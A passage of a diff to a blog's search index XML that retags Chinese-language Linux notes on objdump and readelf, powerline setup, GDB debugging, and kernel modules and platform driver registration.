-D 反汇编所有section (-d反汇编特定section) -h 显示目标文件各个section的头部摘要信息 -x 显示所有可用的头信息，包括符号表、重定位入口。-x 等价于 -a -f -h -r -t 同时指定。 -i 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 -r 显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 -R 显示文件的动态重定位入口，仅仅对于动态目标文件有意义，比如某些共享库。 -S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 -t 显示文件的符号表入口。类似于nm -s提供的信息 readelf这个工具和objdump命令提供的功能类似，但是它显示的信息更为具体，并且它不依赖BFD库(BFD库是一个GNU项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件） ELF文件类型 ELF(Executable and Linking Format)是一种对象文件的格式，用于定义不同类型的对象文件(Object files)中都放了什么东西、以及都以什么样的格式去放这些东西。它自最早在 System V 系统上出现后，被 xNIX 世界所广泛接受，作为缺省的二进制文件格式来使用。可以说，ELF是构成众多xNIX系统的基础之一。 ELF文件有三种类型： 可重定位的对象文件(Relocatable file)由汇编器汇编生成的 .o 文件 可执行的对象文件(Executable file)可执行应用程序 可被共享的对象文件(Shared object file)动态库文件，也即 .so 文件 .text section 里装载了可执行代码； .data section 里面装载了被初始化的数据； .bss section 里面装载了未被初始化的数据； 以 .rec 打头的 sections 里面装载了重定位条目； .symtab 或者 .dynsym section 里面装载了符号信息； .strtab 或者 .dynstr section 里面装载了字符串信息； linux-readelf arLinux ar命令用于建立或修改备存文件，或是从备存文件中抽取文件。ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。 必要参数： -d 删除备存文件中的成员文件。 -m 变更成员文件在备存文件中的次序。 -p 显示备存文件中的成员文件内容。 -q 将文件附加在备存文件末端。 -r 将文件插入备存文件中。 -t 显示备存文件中所包含的文件。 -x 自备存文件中取出成员文件。 选项参数： a&lt;成员文件&gt; 将文件插入备存文件中指定的成员文件之后。 b&lt;成员文件&gt; 将文件插入备存文件中指定的成员文件之前。 c 建立备存文件。 f 为避免过长的文件名不兼容于其他系统的ar指令指令，因此可利用此参数，截掉要放入备存文件中过长的成员文件名称。 i&lt;成员文件&gt; 将问家插入备存文件中指定的成员文件之前。 o 保留备存文件中文件的日期。 s 若备存文件中包含了对象模式，可利用此参数建立备存文件的符号表。 S 不产生符号表。 u 只将日期较新文件插入备存文件中。 v 程序执行时显示详细的信息。 V 显示版本信息。]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
       <tags>
         <tag>Linux</tag>
       </tags>
@@ -241,8 +241,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -253,8 +253,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -265,8 +265,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -289,8 +289,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -301,8 +301,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -326,8 +326,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -338,8 +338,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -350,8 +350,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -362,8 +362,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -379,7 +379,7 @@
     <url>%2F2018%2F07%2F17%2Fsoftware%2FCentos7-bash-%E5%AE%89%E8%A3%85powerline%2F</url>
     <content type="text"><![CDATA[安装powerline123sudo yum install epel-releasesudo yum install python-pippip install powerline-status 查看安装位置 pip show powerline-status12345678910Name: powerline-statusVersion: 2.7Summary: The ultimate statusline/prompt utility.Home-page: https://github.com/powerline/powerlineAuthor: Kim SilkebaekkenAuthor-email: kim.silkebaekken+vim@gmail.comLicense: MITLocation: /usr/lib/python2.7/site-packagesRequires: Required-by: 在 Bash Shell 中添加/启用 Powerline123456if [ -f `which powerline-daemon` ]; then powerline-daemon -q POWERLINE_BASH_CONTINUATION=1 POWERLINE_BASH_SELECT=1 . /usr/lib/python2.7/site-packages/powerline/bindings/bash/powerline.shfi vim启用Powerline1234&quot; vi ~/.vimrcset rtp+=/usr/lib/python2.7/site-packages/powerline/bindings/vim/set laststatus=2set t_Co=256 解决不能显示git分支问题1234567891011mkdir -p ~/.config/powerlinecat &lt;&lt;-'EOF' &gt; ~/.config/powerline/config.json&#123; "ext": &#123; "shell": &#123; "theme": "default_leftonly" &#125; &#125;&#125;EOFpowerline-daemon --replace]]></content>
       <categories>
-        <category>工具篇</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>Linux</tag>
@@ -592,10 +592,12 @@
     <title><![CDATA[GDB 调试]]></title>
     <url>%2F2018%2F02%2F20%2Frebuild%2FGDB-%E8%B0%83%E8%AF%95%2F</url>
     <content type="text"><![CDATA[GDB 调试篇运行命令 run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。 continue （简写c ）：继续执行，到下一个断点处（或运行结束） next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。 step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的 until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。 until+行号： 运行至某行，不仅仅用来跳出循环 finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。 call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55) quit：简记为 q ，退出gdb 设置断点 break n （简写b n）:在第n行处设置断点 （可以带上代码路径和代码名称： b OAGUPDATE.cpp:578） b fn1 if a＞b：条件断点设置 break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button delete 断点号n：删除第n个断点 disable 断点号n：暂停第n个断点 enable 断点号n：开启第n个断点 clear 行号n：清除第n行的断点 info b （info breakpoints） ：显示当前程序的断点设置情况 delete breakpoints：清除所有断点： 查看源代码 list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。 list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12 list 函数名：将显示“函数名”所在函数的源代码，如：list main list ：不带参数，将接着上一次 list 命令的，输出下边的内容。 打印表达式 print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。 print a：将显示整数 a 的值 print ++a：将把 a 中的值加1,并显示出来 print name：将显示字符串 name 的值 print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数 print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数 display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a whatis ：查询变量或函数 info function： 查询函数 扩展info locals： 显示当前堆栈页的所有变量 查询运行信息 where/bt ：当前运行的堆栈列表； bt backtrace 显示当前调用堆栈 up/down 改变堆栈显示的深度 set args 参数:指定运行时的参数 show args：查看设置好的参数 info program： 来查看程序的是否在运行，进程号，被暂停的原因。 调试调试问题 字符串显示不全 (gdb) p recvbuf ​ $1 = 0x7ffff2692eb0 “{\n \”errcode\”: 0,\n \”errlevel\”: 68,\n \”errmsg\”: \”i`m ip:192.168.2.253\”,\n \”filename\”: \”main.cpp\”,\n \”happenddata\”: \”(2017-08-18 15:36:49 周五)\”,\n \”isbehave\”: 0,\n \”ishardware\”: 0,\n “… GDB 默认显示 200 的字符长度; (gdb) show print elements Limit on string chars or array elements to print is 200. 使用set print elements [] 调整参数 set print elements 0 调整 set print elements 300 GDB 调试程序,找不到源码,list无效 12show directories ## 查看当前GDB寻找源码路径dir dirname ## 添加一个新的源代码查找路径; 多个用 : 分开 ​ 查看源代码信息: 文件名, 路径, Source language等 1info source 查看当前栈 bt (backtrace)/ f (frame) f: 打印栈的层编号, 当前函数名， 函数参数值, 所在文件, 行号, 执行语句等 up: 表示向栈的上面移动n层, 默认 1 down: 标识向栈的下面移动n层, 默认 1 info args 打印当前函数的参数名以及值 info locals 打印当前函数中所有局部变量以及值 info catch 打印当前的函数中异常处理信息 list : list + 显示往后代码 list - 显示之前代码 set listsize 设置一次显示源代码行数 show listsize 显示当前listsize 设置 搜索源代码 : 可以使用正则表达式 forward-search / search 向前搜索 reverse-search 全部搜索 输出格式: x 按十六进制格式显示变量 d 按十进制格式显示变量 u 按十六进制格式显示无符号整型 o 按八进制格式显示变量 t 按二进制格式显示变量 a 按十六进制格式显示变量 c 按字符格式显示变量 f 按浮点数格式显示变量 1234(gdb) p i$21 = 101(gdb) p/a i$22 = 0x65 查看结构体类型 ptype123456(gdb) ptype Listtype = struct List &#123; NodeTag type; int length; ListCell *head; ListCell *tail; 改变程序执行print x=4 whatis width // 查看数据类型 set width=47 // 修改值; jump 跳转执行 jump 提供乱序执行的功能。 GDB可以修改程序的执行顺序,让程序执行随意的跳转; jump 指定下一条语句的运行点， 可以是文件的行号， 可以使file:line 格式， 可以使+num 偏移量格式,表示着下一条运行语句从哪开始 jump 代码行的运行地址: ​ jump 命令不会改变当前程序栈的内容，所以，当你从一个函数跳到另一个函数时，函数运行完返回时进行弹栈操作时必然会发生错误，可能结果非常奇怪， 甚至产生Core dump文件， 所以最好在同一个函数中跳转; jump 修改寄存器地址, set $pc 1set $pc = 0x485 产生信号量使用signal命令，可以产生一个信号量给被调试的程序。如: 中断信号Ctrl + C , 这非常方便程序的调试， 可以在程序运行的任意位置设置断点，并在该断点用GDB产生一个信号量，精确在某处产生信号非常有利于调试。 语法： signal, Unix 的系统信号量通常从1到15，所以取值也在这个范围。 signal 命令和shell的kill不同，系统的kill命令发送信号给被调试程序时，是有GDB截获，而signal命令所发出一信号则是直接发给被调试程序的。 强制函数返回如果你的调试断点在某个函数中，并还有语句没有执行完， 你可以使用return命令强制函数忽略还没有执行的语句并返回。 return 使用return命令取消当前函数的执行，并立即返回，如果指定了，那么该表达式的值会被认作函数的返回值 设置临时变量 set var示例 123456789101112131415#include &lt;stdio.h&gt;int func(void)&#123; int i = 2; return i;&#125;int main(void)&#123; int a = 0; a = func(); printf("%d\n", a); return 0;&#125; 技巧 在gdb中，可以用“set var variable=expr”命令设置变量的值，以上面代码为例： 1234567Breakpoint 2, func () at a.c:55 int i = 2;(gdb) n7 return i;(gdb) set var i = 8(gdb) p i$4 = 8 可以看到在func函数里用set命令把i的值修改成为8。 也可以用“set {type}address=expr”的方式，含义是给存储地址在address，变量类型为type的变量赋值，仍以上面代码为例： 123456789Breakpoint 2, func () at a.c:55 int i = 2;(gdb) n7 return i;(gdb) p &amp;i$5 = (int *) 0x8047a54(gdb) set &#123;int&#125;0x8047a54 = 8(gdb) p i$6 = 8 可以看到i的值被修改成为8。 另外寄存器也可以作为变量，因此同样可以修改寄存器的值: 1234567891011121314Breakpoint 2, func () at a.c:55 int i = 2;(gdb)(gdb) n7 return i;(gdb)8 &#125;(gdb) set var $eax = 8 ;; 修改寄存器地址;(gdb) nmain () at a.c:1515 printf("%d\n", a);(gdb)816 return 0; 可以看到因为eax寄存器存储着函数的返回值，所以当把eax寄存器的值改为8后，函数的返回值也变成了8。 强制调用函数call 表达式中可以是函数， 以此达到强制调用函数的目的， 并显示函数的返回值，如果函数返回值是void，那么就不显示。 另一个相似的命令也可以完成这一功能 -- print， print 后边可以跟表达式，所以也可以用它来调用函数， print 和 call 的不同是， 如果函数返回void, call 则不显示， print则显示函数的返回值，并把该值存入历史数据中. GDB 调试子进程 follow-fork-mode follow-fork-mode 用法: 1set follow-fork-mode [parent|child] parent: fork之后继续调试父进程，子进程不受影响。 child: fork之后调试子进程，父进程不受影响。 因此如果需要调试子进程，在启动gdb后：(gdb) set follow-fork-mode child 示例 GDB 同时调试父子进程 detach-on-fork参数，指示GDB在fork之后是否断开（detach）某个进程的调试，或者都交由GDB控制： set detach-on-fork [on|off] on: 断开调试follow-fork-mode指定的进程。GDB 默认参数 off: gdb将控制父进程和子进程。follow-fork-mode指定的进程将被调试，另一个进程置于暂停（suspended）状态。 注意，最好使用GDB 6.6或以上版本，如果你使用的是GDB6.4，就只有follow-fork-mode模式。 命令与参数查看结构体类型 ptype123456(gdb) ptype Listtype = struct List &#123; NodeTag type; int length; ListCell *head; ListCell *tail; 调试宏定义 -g[level]12345678Request debugging information and also use level to specify how much information. The default level is 2.Level 0 produces no debug information at all. Thus, -g0 negates -g.Level 1 produces minimal information, enough for making backtraces in parts of the program that you don't plan to debug. This includes descriptions offunctions and external variables, but no information about local variables and no line numbers.Level 3 includes extra information, such as all the macro definitions present in the program. Some debuggers support macro expansion when you use -g3.-gdwarf-2 does not accept a concatenated debug level, because GCC used to support an option -gdwarf that meant to generate debug information in version1 of the DWARF format (which is very different from version 2), and it would have been too confusing. That debug format is long obsolete, but theoption cannot be changed now. Instead use an additional -glevel option to change the debug level for DWARF. 配置文件 ~/.gdbinit123456789101112131415161718set startup-with-shell offset listsize 30#缩进 显示结构体成员set print pretty on#保存历史命令set history filename ~/.gdb_historyset history save on#gdb 过程记录#set logging file log.txtset logging on#是否让输出覆盖之前的日志文件#set logging overwrite on]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
       <tags>
         <tag>Linux</tag>
         <tag>GDB</tag>
-        <tag>调试</tag>
       </tags>
   </entry>
   <entry>
@@ -656,9 +658,12 @@
     <title><![CDATA[Kernel-基础知识]]></title>
     <url>%2F2018%2F01%2F18%2Fkernel%2FKernel-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
     <content type="text"><![CDATA[内核基本知识: 内核结构 补丁 内核编译 内核代码树介绍:linux-2.6.29 ｜－arch : 包含和硬件体系结构相关的代码 ｜－block : 硬盘调度算法，不是驱动 ｜－firmware : 固件，如BOIS ｜－Documentation: 标准官方文档 ｜－dirver : linux设备驱动 ｜－fs : 内核所支持的文件体系 ｜－include ：头文件。linux/module.h linux/init.h 常用库。 ｜－init ：库文件代码，C库函数在内核中的实现。 ​ init/main.c -&gt;start_kernel-&gt;内核执行第一条代码 ｜－ipc : 进程件通信 ｜－mm ：内存管理 ｜－kernel : 内核核心部分，包括进程调度等 ｜－net ：网络协议 ｜－sound : 所有音频相关 内核补丁:补丁基于某个版本内核生成的，用于升级旧版本内核。 对应版本的补丁只能用于对应版本的内核 如果在已打补丁的内核中再打补丁，需要先卸载原先补丁。 制作补丁: 1diff -Nur linux-2.6.30/ linux-2.6.30.1/ &gt; linux-2.6.30.1.patch 打补丁: 12345cd linux-2.6.30 //！！注意在原文件夹的目录中打补丁patch -p1 &lt; ../linux-2.6.30.1.patch //-p1是忽略一级目录##单文件patch vimrc &lt; vim.1.patch // 即可 撤销补丁 12cd linux-2.6.30 //！！注意在原文件夹的目录中打补丁patch -R &lt; ../linux-2.6.30.1.patch //撤销补丁 ​ 内核与模块编译1make = make bzImage + make modules 如果只编译内核， 即只编译配置文件中的 -y 选项， 可以直接用命令make bzImage 如果只编译模块， 即只编译配置文件中的 -m 选项, 可以直接使用 make modules 只是想单独编译一个模块， 则可以使用: 1make -C /root/linux-2.6.29/xxx/ M=`pwd` module //-C 指定内核makefile的路径，可以使用相对路径。 //-M 指定要编译的文件的路径，同样使用相对路径。 编译生成的模块可以指定存放目录 1make -C /root/linux-2.6.29/xxx M=`pwd` modules_install INSTALL_MOD_PATH=/modules/]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
-        <tag>Arm</tag>
         <tag>Linux</tag>
+        <tag>Arm</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -742,9 +747,12 @@
     <title><![CDATA[Kernel-printk]]></title>
     <url>%2F2017%2F12%2F25%2Fkernel%2FKernel-printk%2F</url>
     <content type="text"><![CDATA[Printkprintk 和 printf 的用法是差不多的，最大区别是printk可以指定打印优先级。 另外一个区别就是 printf只在用户态 printk用于内核态。 定义于: $itop_kernel/include/linux/printk.h 12345678#define KERN_EMERG &quot;&lt;0&gt;&quot; /* system is unusable */#define KERN_ALERT &quot;&lt;1&gt;&quot; /* action must be taken immediately */#define KERN_CRIT &quot;&lt;2&gt;&quot; /* critical conditions */#define KERN_ERR &quot;&lt;3&gt;&quot; /* error conditions */#define KERN_WARNING &quot;&lt;4&gt;&quot; /* warning conditions */#define KERN_NOTICE &quot;&lt;5&gt;&quot; /* normal but significant condition */#define KERN_INFO &quot;&lt;6&gt;&quot; /* informational */#define KERN_DEBUG &quot;&lt;7&gt;&quot; /* debug-level messages */ 而终端控制台的输出优先级配置在文件/proc/sys/kernel/printk中： 12[root: /]# cat /proc/sys/kernel/printk4 4 1 7 4 4 1 7分别是： 4：console_loglevel //这个就是控制台的默认优先级 4：default_message_loglevel // 这个是printk的默认输出优先级 1：minimum_console_level 7：default_console_loglevel]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
-        <tag>Arm</tag>
         <tag>Linux</tag>
+        <tag>Arm</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -772,9 +780,12 @@
     <title><![CDATA[Kernel_module_param]]></title>
     <url>%2F2017%2F12%2F16%2Fkernel%2FKernel-module-param%2F</url>
     <content type="text"><![CDATA[module_param 内核传参用户态C语言中， 函数传参使用main(int argc, char ** argv)， 而内核态传参数使用: 在内核函数中使用 module_param指定模块参数。 加载内核时传递参数给模块。 module_param 函数$itop_kernel/include/linux/moduleparam.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * module_param - typesafe helper for a module/cmdline parameter * @value: the variable to alter, and exposed parameter name. * @type: the type of the parameter * @perm: visibility in sysfs. * * @value becomes the module parameter, or (prefixed by KBUILD_MODNAME and a * &quot;.&quot;) the kernel commandline parameter. Note that - is changed to _, so * the user can use &quot;foo-bar=1&quot; even for variable &quot;foo_bar&quot;. * * @perm is 0 if the the variable is not to appear in sysfs, or 0444 * for world-readable, 0644 for root-writable, etc. Note that if it * is writable, you may need to use kparam_block_sysfs_write() around * accesses (esp. charp, which can be kfreed when it changes). * * The @type is simply pasted to refer to a param_ops_##type and a * param_check_##type: for convenience many standard types are provided but * you can create your own by defining those variables. * * Standard types are: * byte, short, ushort, int, uint, long, ulong * charp: a character pointer * bool: a bool, values 0/1, y/n, Y/N. * invbool: the above, only sense-reversed (N = true). */#define module_param(name, type, perm) \ module_param_named(name, name, type, perm)/*** name: 内核中参数的名称* type: 数据类型, byte, short, int, long, ulong, bool, charp(字符指针)* perm: 内核参数权限。 可以查看 include/linux/stat.h**/#define S_ISUID 0004000#define S_ISGID 0002000#define S_ISVTX 0001000#define S_IRWXU 00700#define S_IRUSR 00400#define S_IWUSR 00200#define S_IXUSR 00100#define S_IRWXG 00070#define S_IRGRP 00040#define S_IWGRP 00020#define S_IXGRP 00010#define S_IRWXO 00007#define S_IROTH 00004#define S_IWOTH 00002#define S_IXOTH 00001#endif#ifdef __KERNEL__#define S_IRWXUGO (S_IRWXU|S_IRWXG|S_IRWXO)#define S_IALLUGO (S_ISUID|S_ISGID|S_ISVTX|S_IRWXUGO)#define S_IRUGO (S_IRUSR|S_IRGRP|S_IROTH)#define S_IWUGO (S_IWUSR|S_IWGRP|S_IWOTH)#define S_IXUGO (S_IXUSR|S_IXGRP|S_IXOTH) 示例1234567891011121314151617181920212223242526272829#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/stat.h&gt;#include &lt;linux/moduleparam.h&gt;static int age = 25;static char *name = &quot;Li Gang&quot;;static int __init hello_init(void)&#123; printk(&quot;age = %d, name = [ %s ]\n&quot;, age, name); return 0;&#125;static void __exit hello_exit(void)&#123; printk(&quot;module: exit hello module\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);module_param(age, int, 0754);module_param(name, charp, 0754);MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);MODULE_AUTHOR(&quot;rocky&quot;); 运行 12345$ sudo insmod module_param.ko age=100Dec 22 00:11:53 ubuntu kernel: [54928.625291] age = 100, name = [ Li Gang ]$ sudo insmod module_param.ko Dec 22 00:12:19 ubuntu kernel: [54954.592554] age = 25, name = [ Li Gang ] 问题 12/home/Postgres/driver/module_param/module_param.c:24:1: note: in expansion of macro ‘module_param’ module_param(age, int, 0666); 最后发现是module_param声明中有关权限的问题， 内核态的所属用户为root 即赋予的 user权限 可以使 r w x 但是group other 的权限最多为 读r, x 不能是可写的.]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
-        <tag>Arm</tag>
         <tag>Linux</tag>
+        <tag>Arm</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -783,7 +794,7 @@
     <url>%2F2017%2F12%2F12%2Fsoftware%2FbPython-%E7%A9%BA%E6%A0%BC%E5%88%A0%E9%99%A4%E4%B8%80%E8%A1%8C%2F</url>
     <content type="text"><![CDATA[经常在有些xshell中使用bpython会出现按一下退格键删除整行的情况。 解决办法，选择xshell属性中的terminal(终端)-&gt;keyboard(键盘)，把backspace键序列修改成 ASCII 127，问题解决]]></content>
       <categories>
-        <category>工具篇</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>Python</tag>
@@ -805,9 +816,12 @@
     <title><![CDATA[Kernel-设备驱动注册]]></title>
     <url>%2F2017%2F12%2F06%2Fkernel%2FKernel-%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E6%B3%A8%E5%86%8C%2F</url>
     <content type="text"><![CDATA[设备驱动​ Linux设备驱动分为三个实体总线、设备(device)、驱动(driver), 平台总线将设备和驱动匹配。 2.6 内核加入了platform虚拟总线，platform机制将设备本身的资源注册进内核，由内核统一管理。 在系统注册任意一个驱动时， 都会寻找对应的设备。 当系统注册设备时，系统也会寻找对应的驱动进行匹配。 Linux设备Linux将设备分为三大类: 字符设备、块设备、网络设备。 字符设备， 字符设备是能够像字节流一样被访问的设备。常见led，蜂鸣器，串口，键盘等等。 块设备， 块设备通过内存缓冲区访问，可以随机存取的设备。通过传输固定大小的数据(一般为512或1k)来访问设备。一般性的理解就是存储介质类的设备，常见字符设备有u盘，TF卡，eMMC,电脑硬盘，光盘等 网络设备，可以和其他主机交换数据的设备。常见的以太网设备，wifi，蓝牙等 cat /proc/devices 可以看到不同的设备都有编号。 主设备号 256， 从设备号 256。 故理论上就有256 * 256 个设备号。 主设备号、从设备号在设备管理中,除了设备类型外，内核还需要一对称为主从设备号的参数， 才能唯一标识一个设备。 主设备号​ 用于标识驱动程序， 相同的主设备号使用相同的驱动程序。 从设备号​ 用于标识同一驱动程序的不同硬件。 Linux 驱动 和 设备 注册过程Linux内核会要求每出现一个设备就要向总线汇报， 或者 出现一个驱动，也要向总线汇报， 或者叫做注册。 系统初始化的时候，会扫描链接了哪些设备，并为每一个设备建立一个struct platform_device的变量，然后将设备的变量插入到devices链表中。如下图所示: 系统初始化任意一个驱动程序的时候，也要准备一个struct platform_driver 结构变量， 然后将驱动的变量插入到drivers链表，如下图所示: Linux总线为了将设备 与 驱动绑定，方便管理。 在注册设备，或者注册驱动时，都会寻找与之匹配的设备，而匹配由总线platform_match函数完成。 注册设备的结构体platform_device， 注册驱动的结构体为platform_driver。设备和驱动的结构体成员name字段，相同则匹配。 并且匹配成功，则会调用platform_driver中的probe函数，注册驱动。 platform_match() 函数 1234567891011121314151617181920212223242526272829/** * platform_match - bind platform device to platform driver. * @dev: device. * @drv: driver. * * Platform device IDs are assumed to be encoded like this: * "&lt;name&gt;&lt;instance&gt;", where &lt;name&gt; is a short description of the type of * device, like "pci" or "floppy", and &lt;instance&gt; is the enumerated * instance of the device, like '0' or '42'. Driver IDs are simply * "&lt;name&gt;". So, extract the &lt;name&gt; from the platform_device structure, * and compare it against the name of the driver. Return whether they match * or not. */static int platform_match(struct device *dev, struct device_driver *drv)&#123; struct platform_device *pdev = to_platform_device(dev); struct platform_driver *pdrv = to_platform_driver(drv); /* Attempt an OF style match first */ if (of_driver_match_device(dev, drv)) return 1; /* Then try to match against the id table */ if (pdrv-&gt;id_table) return platform_match_id(pdrv-&gt;id_table, pdev) != NULL; /* fall-back to driver name match */ return (strcmp(pdev-&gt;name, drv-&gt;name) == 0);&#125; 驱动 platform_driver 头文件: 结构体: platform_driver 位于 include/linux/platform_device.h 头文件 12345678910111213extern int platform_driver_register(struct platform_driver *)extern void platform_driver_unregister(struct platform_driver *);struct platform_driver &#123; int (*probe)(struct platform_device *); // 进行设备的探测和初始化。 int (*remove)(struct platform_device *); // 移除驱动，用于去掉设备节点或者释放软硬件资源 void (*shutdown)(struct platform_device *); int (*suspend)(struct platform_device *, pm_message_t state); int (*resume)(struct platform_device *); struct device_driver driver; const struct platform_device_id *id_table; &#125; ​ 驱动常见状态： 初始化 移除 休眠 复位 ​ probe函数: platform_match 函数匹配之后， 驱动调用的初始化函数 remove函数: 移除驱动函数 suspend函数 悬挂(休眠)驱动函数 resume函数: 休眠后恢复驱动 shudown 函数: device_driver 数据结构 name 和 注册设备name 一致 owner 一般赋值THIS_MODULE 设备 platform_device头文件: 结构体: platform_device 位于 include/linux/platform_device.h 头文件 123456789101112131415struct platform_device &#123; const char * name; //设备名称， 在 /sys/devices 会显示。 int id; //设备id，用于插入总线并且具有相同name的设备编号，如果只有一个设备则为-1 struct device dev; //结构体中内嵌的device结构体 u32 num_resources;//设备使用资源的数量 struct resource * resource;//设备使用的资源数组 const struct platform_device_id *id_entry; /* MFD cell pointer */ struct mfd_cell *mfd_cell; /* arch specific additions */ struct pdev_archdata archdata;&#125;; 第二个参数”id” 表示子设备编号， 一个设备如果有多个子设备，则需要写入子设备号数量， 只有一个则为 -1 ​ 定义于: $kernel/drivers/base/platform.c 12345678910111213141516171819202122232425/** * platform_device_register - add a platform-level device * @pdev: platform device we're adding */int platform_device_register(struct platform_device *pdev)&#123; device_initialize(&amp;pdev-&gt;dev); return platform_device_add(pdev);&#125;EXPORT_SYMBOL_GPL(platform_device_register);/** * platform_device_unregister - unregister a platform-level device * @pdev: platform device we're unregistering * * Unregistration is done in 2 steps. First we release all resources * and remove it from the subsystem, then we drop reference count by * calling platform_device_put(). */void platform_device_unregister(struct platform_device *pdev)&#123; platform_device_del(pdev); platform_device_put(pdev);&#125;EXPORT_SYMBOL_GPL(platform_device_unregister); ​ 注册设备到平台总线:以三星itop-4412为例: 方法适用于源码：(静态注册) 1vi $itop-kernel/arch/arm/mach-exynos/mach-itop4412.c 注: s3c_device_hello_ctl 即注册的platform_device 设备变量信息. 按照其他模块方式编写。 hello模块即可， 同时确保 宏定义 ，变量未重复。 对应在 $itop-kernel/drivers/char/Kconfig 添加对应模块选择配置 12345config HEOLL_CTL bool "Enable hello config" default y help Enable hello config 即make menuconfig 所示如下图: 即保存退出， 重新编译 make zImage , 烧写至开发板。 ls -ls /sys/devices/platform 即可看到新注册的hello驱动。 ls /sys/class/misc/ 方法二:(动态注册) 12345678910111213141516171819202122232425262728293031static void hello_dev_release(struct device *dev)&#123; printk(&quot;hello_dev release&quot;);&#125;static struct platform_device hello_dev = &#123; .name = &quot;hello_name&quot;, // device`s name .id = -1, .dev = &#123; .release = hello_dev_release, &#125;,&#125;;//注册设备;static int __init device_init(void)&#123; int ret = 0; ret = platform_device_register(&amp;hello_dev); printk(KERN_WARNING &quot;platform_device_register ret = %d\n&quot;, ret); return 0;&#125;static void __exit device_exit(void)&#123; platform_device_unregister(&amp;hello_dev); printk(KERN_WARNING &quot;platform_device_register exit\n&quot;);&#125;module_init(device_init);module_exit(device_exit); 完整源码 方法三:(mknod) 12345678910111213 创建特殊文件。 mknod Name &#123; b | c &#125; Major Minor 创建 FIFO（已命名的管道） mknod Name &#123; p &#125;TYPE may be: b create a block (buffered) special file c, u create a character (unbuffered) special file p create a FIFO 示例: 1mknod /dev/input/mouse0 c 12 32 注册驱动到平台总线 platform_driver_register函数 和 platform_driver_unregister函数 用于注册 和 卸载驱动。 platform_driver结构体 定义宏变量 DRIVER_NAME &quot;hello_ctl&quot; (注： 与注册hello设备时的名称相同。) 编写模块 module_init module_exit 分别在其中注册 和 卸载驱动platform_driver_register platform_driver_unregister 123456789101112131415161718192021222324252627static int __init hello_init(void)&#123; int DriverState = 0; printk(KERN_WARNING "Welcome hello-module init\n"); DriverState = platform_driver_register(&amp;hello_driver); printk(DRIVER_NAME "state = \t", DriverState); return 0;&#125;static void __exit hello_exit(void)&#123; printk(KERN_WARNING "byebye hello-module exit\n"); platform_driver_unregister(&amp;hello_driver); &#125;//注册 并初始化模块module_init(hello_init)//模块退出， 并关闭内存;module_exit(hello_exit) ​ 其中注册 和 